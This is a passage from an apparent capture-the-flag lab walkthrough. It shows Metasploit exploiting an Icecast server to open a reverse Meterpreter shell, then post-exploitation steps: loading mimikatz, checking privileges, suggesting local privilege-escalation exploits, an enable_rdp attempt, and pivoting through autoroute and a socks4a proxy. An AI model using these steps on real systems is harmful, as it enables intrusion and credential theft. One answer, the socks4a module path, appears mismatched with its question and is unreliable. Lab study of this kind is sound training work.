msf5 exploit(windows/http/icecast_header) > set RHOSTS 10.10.223.155
RHOSTS => 10.10.223.155
```

`No answer needed`

12. Once you're set those variables correctly, run the exploit now via either the command 'exploit' or the command 'run -j' to run this as a job.

```
msf5 exploit(windows/http/icecast_header) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.8.106.222:4444 
msf5 exploit(windows/http/icecast_header) > [*] Sending stage (176195 bytes) to 10.10.223.155
[*] Meterpreter session 1 opened (10.8.106.222:4444 -> 10.10.223.155:49293) at 2020-09-11 05:16:03 -0400
msf5 exploit(windows/http/icecast_header) > 
```

`No answer needed`

13. Once we've started this, we can check all of the jobs running on the system by running the command `jobs`

```
msf5 exploit(windows/http/icecast_header) > jobs

Jobs
====

No active jobs.
```

`No answer needed`

14. After we've established our connection in the next task, we can list all of our sessions using the command `sessions`. Similarly, we can interact with a target session using the command `sessions -i SESSION_NUMBER`

```
msf5 exploit(windows/http/icecast_header) > sessions

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.106.222:4444 -> 10.10.223.155:49293 (10.10.223.155)
```

```
msf5 exploit(windows/http/icecast_header) > sessions -i 1
[*] Starting interaction with 1...
```

`No answer needed`

## [Task 6] We're in, now what? 

Now that we've got a shell into our victim machine, let's take a look at several post-exploitation modules actions we can leverage! Most of the questions in the following section can be answered by using the Meterpreter help menu which can be accessed through the 'help' command. This menu dynamically expands as we load more modules.

1. First things first, our initial shell/process typically isn't very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command 'ps'. What's the name of the spool service?

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]                                   
 4     0     System                                             
 416   4     smss.exe                                           
 544   536   csrss.exe                                          
 584   692   svchost.exe                                        
 592   536   wininit.exe                                        
 604   584   csrss.exe                                          
 652   584   winlogon.exe                                       
 692   592   services.exe                                       
 700   592   lsass.exe                                          
 708   592   lsm.exe                                            
 816   692   svchost.exe                                        
 884   692   svchost.exe                                        
 932   692   svchost.exe                                        
 1020  692   svchost.exe                                        
 1056  692   svchost.exe                                        
 1140  692   svchost.exe                                        
 1256  692   spoolsv.exe                                        
 1320  692   svchost.exe                                        
 1400  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1508  1020  dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1520  1500  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1544  816   WmiPrvSE.exe                                       
 1548  692   amazon-ssm-agent.exe                               
 1700  692   LiteAgent.exe                                      
 1740  692   svchost.exe                                        
 1880  692   Ec2Config.exe                                      
 2144  692   svchost.exe                                        
 2264  604   conhost.exe           x64   1                      
 2304  692   sppsvc.exe                                         
 2332  1520  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2456  692   svchost.exe                                        
 2516  692   taskhost.exe          x64   1                      
 2576  692   SearchIndexer.exe                                  
 2728  816   rundll32.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\rundll32.exe
 2736  2516  WinSAT.exe            x64   1                      
 2760  2728  dinotify.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\dinotify.exe
 2972  544   conhost.exe                                        
 3032  1020  Defrag.exe
```

`spoolsv.exe`

2. Let's go ahead and move into the spool process or at least attempt to! What command do we use to transfer ourselves into the process? This won't work at the current time as we don't have sufficient privileges but we can still try!

`migrate`

3. Well that migration didn't work, let's find out some more information about the system so we can try to elevate. What command can we run to find out more information regarding the current user running the process we are in?

```
meterpreter > getuid
Server username: Dark-PC\Dark
```

`getuid`

4. How about finding more information out about the system itself?

```
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

`sysinfo`

5. This might take a little bit of googling, what do we run to load mimikatz (more specifically the new version of mimikatz) so we can use it? 

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success
```

`load kiwi`

6. Let's go ahead and figure out the privileges of our current user, what command do we run?

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

`getprivs`

7. What command do we run to transfer files to our victim computer?

```
meterpreter > upload
Usage: upload [options] src1 src2 src3 ... destination

Uploads local files and directories to the remote machine.

OPTIONS:

    -h        Help banner
    -r        Upload recursively
```

`upload`

8. How about if we want to run a Metasploit module?

```
meterpreter > run
Usage: run <script> [arguments]

Executes a ruby script or Metasploit Post module in the context of the
meterpreter session.  Post modules can take arguments in var=val format.
Example: run post/foo/bar BAZ=abcd
```

`run`

9. A simple question but still quite necessary, what command do we run to figure out the networking information and interfaces on our victim?

```
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a0a:df9b
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 13
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:14:f8:26:fa:39
MTU          : 9001
IPv4 Address : 10.10.223.155
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::7c1b:890e:2266:faba
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

`ipconfig`

10. Let's go ahead and run a few post modules from Metasploit. First, let's run the command `run post/windows/gather/checkvm`. This will determine if we're in a VM, a very useful piece of knowledge for further pivoting.

```
meterpreter > run post/windows/gather/checkvm

[*] Checking if DARK-PC is a Virtual Machine .....
[+] This is a Xen Virtual Machine
```

`No answer needed`

11. Next, let's try: `run post/multi/recon/local_exploit_suggester`. This will check for various exploits which we can run within our session to elevate our privileges. Feel free to experiment using these suggestions, however, we'll be going through this in greater detail in the room `Ice`.

```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.223.155 - Collecting local exploits for x86/windows...
[*] 10.10.223.155 - 30 exploit checks are being tried...
[+] 10.10.223.155 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

`No answer needed`

12. Finally, let's try forcing RDP to be available. This won't work since we aren't administrators, however, this is a fun command to know about: `run post/windows/manage/enable_rdp`

```
meterpreter > run post/windows/manage/enable_rdp

[-] Insufficient privileges, Remote Desktop Service was not modified
[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20200911054026_default_10.10.223.155_host.windows.cle_458968.txt
```

`No answer needed`

13. One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell?

`shell`

## [Task 7] Makin' Cisco Proud

Last but certainly not least, let's take a look at the autorouting options available to us in Metasploit. While our victim machine may not have multiple network interfaces (NICs), we'll walk through the motions of pivoting through our victim as if it did have access to extra networks.

1. Let's go ahead and run the command `run autoroute -h`, this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the -n flag in your answer.

```
meterpreter > run autoroute -h

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Usage:   run autoroute [-r] -s subnet -n netmask
[*] Examples:
[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
[*]   run autoroute -p                            # Print active routing table
[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
[*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module
```

`run autoroute -s 172.18.1.0 -n 255.255.255.0`

2. Additionally, we can start a socks4a proxy server out of this session. Background our current meterpreter session and run the command `search server/socks4a`. What is the full path to the socks4a auxiliary module?

```
msf5 exploit(windows/http/icecast_header) > search server/socks4a

Matching Modules
================

   #  Name                      Disclosure Date  Rank    Check  Description
   -  ----                      ---------------  ----    -----  -----------
   0  auxiliary/server/socks4a                   normal  No     Socks4a Proxy Server
```

`search server/socks4a`

3. Once we've started a socks server we can modify our /etc/proxychains.conf file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks4a server with proxychains?

```
msf5 exploit(windows/http/icecast_header) > proxychains
[*] exec: proxychains

ProxyChains-3.1 (http://proxychains.sf.net)
        usage:
                proxychains <prog> [args]
```

`proxychains`
